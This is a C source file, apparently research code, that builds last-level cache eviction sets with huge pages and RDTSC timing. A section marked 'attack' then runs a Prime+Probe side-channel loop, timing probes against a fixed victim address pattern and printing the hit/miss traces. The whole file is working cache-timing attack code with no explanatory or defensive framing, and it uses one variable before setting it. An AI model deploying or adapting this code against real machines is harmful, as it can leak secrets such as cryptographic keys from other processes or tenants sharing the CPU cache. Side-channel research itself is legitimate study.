#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <inttypes.h>
#define SET 2048
#define WAY 20
#define N 8*WAY*2
#define SIZE SET*N
#define THR 100
#define T 180
#define CONF -1
#define EVIC -2
#define FLAG 0xfffffffe0000
#define L 96
#define R 5

#define RDTSC(X) asm volatile("rdtsc; shlq $32, %%rdx; orq %%rdx, %%rax":"=r"(X) :: "%rdx")

#define LENGTH (256UL*1024*1024)
#define PROTECTION (PROT_READ | PROT_WRITE)
#ifndef MAP_HUGETLB
#define MAP_HUGETLB 0x40000
#endif
//#define ADDR ((void *)0x0UL)
#define FLAGS (MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB)

struct st{
	char name[16];
	int num;
	int count;
	int flag;
	struct st *next;
	struct st *prev;
	struct st *e_next;
	struct st *e_prev;
};
struct box{
	uintptr_t num;
	int counter;
	int head;
};

void loop();
void shuffle(int *array, int set, int n);
void insert(struct st *set, struct st *candidate);
void e_insert(struct st *set, struct st *candidate);
void myremove(struct st *candidate);
void conv(uintptr_t num);
int probe(struct st *set, struct st *candidate);
int probe2(struct st *set, struct st *candidate);

int main(){
	int i, j, k, l, n, set, lines[N], counter;
	int box_num, box_flag, set_num;
	uintptr_t evi_buf[L][R];
	uintptr_t evi_real[L], evi_real_tmp[L];
	struct st *buf;
	struct box *mybox;

	set_num = 0;
	
	//buf = (struct st*)malloc(sizeof(struct st)*SIZE);
	buf = mmap(NULL, LENGTH, PROTECTION, FLAGS, -1, 0);
	mybox = (struct box*)malloc(sizeof(struct box)*R);
	unsigned long long time, t1, t2;

	/*
	printf("buf[0]      %p\n",&buf[0]);
	printf("buf[1]      %p\n",&buf[1]);	
	printf("buf[SIZE-1] %p\n",&buf[SIZE-1]);
	*/
	//printf("size %d\n",sizeof(struct st));

	//loop start-----------------------------------------------------------
	set = 10;
	for(;;){
		for(i = 0; i < N; i++) lines[i] = i;
		for(i = 0; i < SIZE; i++){
			buf[i].num = i;
			buf[i].count = 0;
		}

		//remove invalid cache lines------------------------------------
		for(j = 0; j < 20; j++){
			struct st *p, *conflict;	

			conflict = (struct st*)malloc(sizeof(struct st));
			conflict->num = CONF;
			conflict->next = conflict->prev = conflict;

			shuffle(lines, j, N);

			for(i = 0; i < N; i++){
				n = lines[i];
				//printf("%d ",n);
				if(!probe(conflict, &buf[n*SET + set])){
					buf[n*SET + set].count++;
				}
				insert(conflict, &buf[n*SET + set]);
			}
			//for(i = 0; i < 1000; i++);
			free(conflict);
		}

		//conflict set----------------------------------------------------
		struct st *conflict;
		conflict = (struct st*)malloc(sizeof(struct st));
		conflict->num = CONF;
		conflict->next = conflict->prev = conflict;

		shuffle(lines, counter, N);
		counter = 0;
		for(i = 0; i < N; i++){
			n = lines[i];
			if(buf[n*SET + set].count >= 18) continue;
			//printf("%d ",n);
			if(!probe(conflict, &buf[n*SET + set])){
				insert(conflict, &buf[n*SET + set]);
				buf[n*SET + set].flag = CONF;
				counter++;
			} else {
				buf[n*SET + set].flag = 0;
			}
		}	

		printf("conflict set %d\n",counter);

		//eviction set----------------------------------------------------
		int number = 0;
		int number_check = 0;
		for(i = 0; i < N; i++){
			n = lines[i];
			if(buf[n*SET + set].count >= 18) continue;
			if(buf[n*SET + set].flag == 0){
				asm("mfence");
				if(probe(conflict, &buf[n*SET + set])){
					//printf("-------------------------------------\n");
					struct st *p, *tmp, *eviction;
					eviction = (struct st*)malloc(sizeof(struct st));
					eviction->num = EVIC;
					eviction->e_next = eviction->e_prev = eviction;

					for(p = conflict->next; p->num != CONF; p = p->next){
						p->prev->next = p->next;
						p->next->prev = p->prev;
						if(!probe2(conflict, &buf[n*SET + set])){
							e_insert(eviction, p);
							//number++;
						}
						p->next->prev = p;
						p->prev->next = p;

					}

					//printf("eviction set\n");
					number_check++;
					for(p = eviction->e_next; p->num != EVIC; p = p->e_next){
						//printf("%p\n",p);
						uintptr_t pnum = (uintptr_t)p;
						pnum &= FLAG;
						evi_buf[number++][set_num] = pnum;
						//printf("evi_buf[%d][%d] : 0x%lx\n", number-1, set_num, evi_buf[number-1][set_num]);
					}
						
					for(p = conflict->next; p->num != CONF; p = p->next){
						if(p->flag == EVIC){
							tmp = p->next;
							myremove(p);
							p = tmp->prev;
						}
					}
					free(eviction);
				}
			}
		}
		if(number_check != 8 || number != L){
			set_num--;
		}
		set_num++;
		printf("%d : set_num %d\n",set,set_num);
		if(set_num == R) break;
	}
	//loop end----------------------------------------------------------------
	printf("set_num %d\n",set_num);
	
	for(i = 0; i < L; i++){
		box_num = 0;
		for(j = 0; j < R; j++){
			mybox[j].num = 0;
			mybox[j].counter = 0;
		}
		mybox[1].num = evi_buf[i][1];
		mybox[1].counter++;
		box_num++;
		
		for(j = 1; j < R; j++){
			for(k = 0; k < box_num; k++){
				box_flag = 0;
				if(evi_buf[i][j] == mybox[k].num){
					box_flag = 1;
					break;
				}
			}
			if(box_flag){
				mybox[k].counter++;
			} else {
				mybox[box_num].num = evi_buf[i][j];
				mybox[box_num].counter++;
				box_num++;
			}
		}
		
		box_flag = 0;
		for(j = 0; j < box_num; j++){
			if(mybox[j].counter >= R/2+1 && mybox[j].num != 0){
				evi_real[i] = mybox[j].num;
				box_flag = 1;
				printf("%d ; %d\n",i ,mybox[j].counter);
			}
		}
		if(!box_flag){
			fprintf(stderr,"eviction set error.\n");
			exit(1);
		}
	}

	for(i = 0; i < L; i++){
		if(i % 16 == 0) printf("\n");
		printf("0x%lx\n",evi_real[i]);
		evi_real_tmp[i] = evi_real[i];
	}

	//attack-------------------------------------------

	fprintf(stderr,"ok\n");
	sleep(5);

	struct box evi_box[L];
	for(i = 0; i < L; i++){
		evi_box[i].num = evi_real[i];
		evi_box[i].counter = i/12;
		evi_box[i].head = 0;
	}
	
	uintptr_t victim = 0x000000000780;
	uintptr_t viflag = 0x000000000fc0;
	int th, addr_num;
	uintptr_t addr;
	int aa = 0;
	int array[1000];

	for(i = 0; i < SIZE; i++){
		addr = (uintptr_t)&buf[i];
		addr &= viflag;
		if(addr == victim){
			addr = (uintptr_t)&buf[i];
			addr &= FLAG;
			for(j = 0; j < L; j++){
				if(evi_box[j].num == addr && !evi_box[j].head){
					evi_box[j].head = i;
					//printf("%d  0x%lx  %d\n",evi_box[j].counter, evi_box[j].num, evi_box[j].head);
					aa++;
				}
			}
		}
		if(aa == L) break;	
	}

	printf("\n");
	for(i = 0; i < L; i++){
		//evi_box[i].num = evi_real[i];
		printf("%d \t0x%lx %d\n",evi_box[i].counter, evi_box[i].num, evi_box[i].head);
	}
	printf("\n");


	printf("0 %p\n",&buf[0]);
	printf("SET  %p\n",&buf[SET-1]);
	printf("SIZE %p\n",&buf[SIZE-1]);
	

	int w;
	printf("Please press any key\n");
	scanf("%d",&w);
	for(i = 0; i < 8; i++){
		printf("------------------%d---------------------\n",i);
		for(j = 0; j < SET; j = j + 64){
			th = 0;
			for(k = 0; k < 1000; k++){
				//printf("%p\n",&buf[j + evi_box[2*i].head]);
				//printf("%p\n\n",&buf[j + evi_box[2*i + 1].head]);
				//if(k % 20 == 0) printf("\n");
				for(l = 0; l < (L/8); l++){
					addr_num = buf[j + evi_box[(L/8)*i+l].head].num;
					addr_num = buf[j + evi_box[(L/8)*i+l].head].num;
					addr_num = buf[j + evi_box[(L/8)*i+l].head].num;
				}
				loop();
				asm("lfence");
				RDTSC(t1);
				for(l = 0; l < (L/8); l++){
					addr_num = buf[j + evi_box[(L/8)*i+l].head].num;
				}
				asm("lfence");
				RDTSC(t2);
				time = t2 - t1;
				//printf("%3llu ",time);
				if(time > T){
					th++;
					array[k] = 1;
				} else {
					array[k] = 0;
				}
			}
			if(th > 100){
				for(k = 0; k < 1000; k++){
					if(k % 50 == 0) printf("\n");
					printf("%d ",array[k]);
				}
				printf("\n");
			}
		}
	}
	//printf("th %d\n",th);
	
	printf("\nend\n");
	return 0;
}

void loop(){
	int i;
	for(i = 0; i < 300000; i++);
}

void shuffle(int *array, int set, int n){
	int i, j, tmp;
	srand(set);
	for(i = 0; i < n; i++){
		j = rand() % N;
		tmp = array[i];
		array[i] = array[j];
		array[j] = tmp;
	}
}


void insert(struct st *set, struct st *candidate){
	candidate->prev = set->prev;
	set->prev->next = candidate;
	candidate->next = set;
	set->prev = candidate;
}

void e_insert(struct st *set, struct st *candidate){
	candidate->flag = EVIC;
	candidate->e_prev = set->e_prev;
	set->e_prev->e_next = candidate;
	candidate->e_next = set;
	set->e_prev = candidate;
}

void myremove(struct st *candidate){
	candidate->prev->next = candidate->next;
	candidate->next->prev = candidate->prev;
	candidate->next = candidate->prev = candidate;
}

void conv(uintptr_t num){
	int i, count;
	int ary[N];
	count = 0;

	while(num){
		if(num & 0x1 == 1){
			ary[count++] = 1;
		} else {
			ary[count++] = 0;
		}
		num >>= 1;
	}
	for(i = count - 1; i >= 0; i--){
		if(i == 5) printf("  ");
		if(i == 16) printf("  ");
		if(i == 19) printf("  ");
		if(i == 26) printf("  ");
		printf("%d",ary[i]);
	}
	printf("\n");
}

int probe(struct st *set, struct st *candidate){
	int i, j, tmp, n;
	unsigned long long time, t1, t2;
	struct st *p;

	n = 0;
	for(i = 0; i < 20; i++){
		asm("mfence");
		tmp = candidate->num;
		tmp = candidate->num;
		tmp = candidate->num;
		for(p = set->prev; p->num != CONF; p = p->prev){
			tmp = p->num;
			tmp = p->num;
			tmp = p->num;
		}
		asm("lfence");	
		RDTSC(t1);
		tmp = candidate->num;
		asm("lfence");
		RDTSC(t2);
		time = t2 - t1;

		if(time > THR) n++;
		//for(j = 0; j < 500; j++);
	}
	return (n>=1);
}

int probe2(struct st *set, struct st *candidate){
	int i, j, tmp, n;
	unsigned long long time, t1, t2;
	struct st *p;

	n = 0;
	for(i = 0; i < 20; i++){
		asm("mfence");
		tmp = candidate->num;
		tmp = candidate->num;
		tmp = candidate->num;
		for(p = set->prev; p->num != CONF; p = p->prev){
			tmp = p->num;
			tmp = p->num;
			tmp = p->num;
		}
		asm("lfence");	
		RDTSC(t1);
		tmp = candidate->num;
		asm("lfence");
		RDTSC(t2);
		time = t2 - t1;

		if(time > THR) n++;
		//for(j = 0; j < 500; j++);
	}
	//printf("%d ",n);
	return (n>=2);
}

